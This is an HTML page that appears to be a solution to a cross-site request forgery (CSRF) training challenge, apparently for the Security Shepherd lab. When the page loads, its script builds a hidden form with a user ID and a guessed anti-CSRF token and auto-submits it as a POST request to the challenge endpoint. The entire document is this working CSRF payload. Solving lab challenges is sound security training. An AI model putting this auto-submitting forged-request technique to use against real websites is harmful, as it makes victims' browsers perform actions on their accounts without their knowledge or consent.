<!doctype HTML>
<html>
    <head>
        <title>Crazydais - CSRF</title>
    </head>

    <body>
        <h1>Crazydais - CSRF 3</h1>
        <script>
            (function () {

                var csrf = 'a1b2';
                var userId = 'fcab4e7dfbe01ce4e3904b97febe6a6a184302c3';
                var form = createForm(userId, csrf);
                form.submit();

            })();

            function addInputToForm(form, name, value) {
                // Create a hidden input element, and append it to the form
                var input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = value;
                form.appendChild(input);
            }

            function createForm(id, csrf) {
                var form = document.createElement('form');
                form.id = "csrf-form";
                form.action = 'https://shepherd.waratek.lan/user/csrfchallengethree/plusplus';
                form.method = 'POST';
                addInputToForm(form, 'userId', id);
                addInputToForm(form, 'csrfToken', csrf);
                return form;
            }
        </script>
    </body>
</html>
